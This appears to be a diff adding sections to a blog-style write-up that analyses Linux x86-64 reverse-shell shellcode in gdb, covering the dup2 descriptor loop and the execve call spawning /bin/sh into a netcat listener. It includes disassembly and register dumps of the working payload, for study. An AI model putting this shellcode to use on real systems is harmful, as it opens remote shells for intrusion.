@@ -354,8 +354,138 @@ listening on [any] 4444 ...
 
 As the registers are correct and all seems ok, `stepi` into the syscall and establish the connection.
 
+#### Section 3: `sys_dup2`
+Time to duplicate the socket descriptor with `stdin`, `stdout` and `stderr`. From the `sys_dup2` function definition:
+```c 
+int dup2(int oldfd, int newfd);
+```
+Values for registers before the syscall have to be:
+- RAX : "0x21" for the syscall number
+- RDI : The socket descriptor. From before in Section 1, it's value is "3"
+- RSI : The file descriptor for standard input, output and error
+The code, as always with `dup2`, does a bucle 3 times, one for each file descriptor. For that, RSI is initialized with "2" value, and on each loop, decrements until "0" to end the loop and continue the execution. This part is not going to be debugged, as it's the same as other assignments and the code is obvious that does the right registers assignments for the correct duplication:
+```asm
+(gdb) disassemble 
+Dump of assembler code for function code:
+**_REMOVED_**
+=> 0x0000555555558084 <+36>:	push   0x3
+   0x0000555555558086 <+38>:	pop    rsi
+   0x0000555555558087 <+39>:	dec    rsi
+   0x000055555555808a <+42>:	push   0x21
+   0x000055555555808c <+44>:	pop    rax
+   0x000055555555808d <+45>:	syscall 
+   0x000055555555808f <+47>:	jne    0x555555558087 <code+39>
+   0x0000555555558091 <+49>:	push   0x3b
+**_REMOVED_**
+End of assembler dump.
+(gdb) 
+```
+As this secion is not debugged, let's place a breakpoint at +49, just after the loop, and `continue` to start next section:
+```asm
+(gdb) b *0x0000555555558091
+Breakpoint 3 at 0x555555558091
+(gdb) c
+Continuing.
+Breakpoint 3, 0x0000555555558091 in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+**_REMOVED_**
+   0x000055555555808d <+45>:	syscall 
+   0x000055555555808f <+47>:	jne    0x555555558087 <code+39>
+=> 0x0000555555558091 <+49>:	push   0x3b
+**_REMOVED_**
+End of assembler dump.
+(gdb) 
+```
+#### Section 4: `sys_execve`
+The command to execute is `/bin/sh` (this been guessed from the **`rbx,0x68732f6e69622f`** hex value checked before. Ad from the function definition:
+```c
+int execve(const char *filename, char *const argv[], char *const envp[]);
+```
+Values for registers have to be:
+- RAX : "0x3b" for the syscall number
+- RDI : @ for the `/bin/sh` string
+- RSI : Pointer to the address containing the address for `/bin/sh` string
+- RDX : NULL as no environment parameters are used
 
+In the code, the RAX is initialized with "0x3b" for the syscall, RDX is NULLed, then `/bin/sh/` is placed in the RBX register to be pushed into the stack. At this point, RDI gets the value of RSP to point to the string. As the Stack Technique is used, now a NULL is pushed to the stack and then, the RDI register that contains the address of the string.
+Let's place a breakpoint just before the syscall and review all registers and stack that have the correct and expected values:
+```asm
+(gdb) b *0x00005555555580a8
+Breakpoint 4 at 0x5555555580a8
+(gdb) c
+Continuing.
+Breakpoint 4, 0x00005555555580a8 in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+**_REMOVED_**
+   0x0000555555558091 <+49>:	push   0x3b
+   0x0000555555558093 <+51>:	pop    rax
+   0x0000555555558094 <+52>:	cdq    
+   0x0000555555558095 <+53>:	movabs rbx,0x68732f6e69622f    <== /bin/sh,0x00
+   0x000055555555809f <+63>:	push   rbx                     
+   0x00005555555580a0 <+64>:	mov    rdi,rsp                 <== RDI <- @/bin/sh
+   0x00005555555580a3 <+67>:	push   rdx                     <== 2nd NULL push
+   0x00005555555580a4 <+68>:	push   rdi                     <== @ of /bin/sh on the stac
+   0x00005555555580a5 <+69>:	mov    rsi,rsp                 <== RSI <- @@ /bin/sh
+=> 0x00005555555580a8 <+72>:	syscall 
+**_REMOVED_**
+End of assembler dump.
+(gdb) 
+```
+Registers values are:
+```asm
+(gdb) info registers rax rdi rsi rdx
+rax            0x3b                59
+rdi            0x7fffffffe748      140737488349000
+rsi            0x7fffffffe738      140737488348984
+rdx            0x0                 0
+(gdb) 
+```
+Let's confirm that RDI and RSI point to the right addresses, and that the stack contains the right data on it:
+- RDI points to the string
+```asm
+(gdb) x/s $rdi                     <== Value of RDI points to the string
+0x7fffffffe748:	"/bin/sh"
+(gdb) 
+```
+- RSI points to the address of the stack where the address for the string is
+```asm
+(gdb) info registers rsi
+rsi            0x7fffffffe738      140737488348984   <== Value of RSI
+(gdb) x/xg $rsi
+0x7fffffffe738:	0x00007fffffffe748              <== Contents of memory pointed by RSI
+                                                      == Is the address containing the addres
+                                                      == of /bin/sh
+(gdb) x/s 0x00007fffffffe748                         <== Points to the string :)
+0x7fffffffe748:	"/bin/sh"
+(gdb) 
+```
+- The stack has the expected data on it:
+```asm
+(gdb) x/3xg $rsi
+0x7fffffffe738:	0x00007fffffffe748	0x0000000000000000    <== @@/fin/sh and NULL
+0x7fffffffe748:	0x0068732f6e69622f                         <== /bin/sh string
+(gdb) 
+```
+Everything is looking good! Time to `stepi` into the syscall
 
+#### The End Section
+Ok, all looks as it was expected. After `stepi` into the syscall, the shell will be spawned in our `netcat` session that we had to open to continue debugging in the previous sections:
+```asm
+(gdb) stepi
+process 1287 is executing new program: /usr/bin/dash
+(gdb) 
+```
+With the expected results:
+
+<img src="https://galminyana.github.io/img/A053_Shellcode_End.png" width="75%" height="75%">
+
+### Thoughts
+---
+As commented before, the only question from this diseection, is where are the 8 bytes for the **sockaddr** struct that have to be NULL. They haven't been placed into the stack, not making the struct to be properly filled.
+
+After some research, i didnt come with any real conclusion. Just i can assume, that the **bzero** is not really checked by the syscall by the type of connection that's being established.
 
 ### GitHub Repo Files
 ---
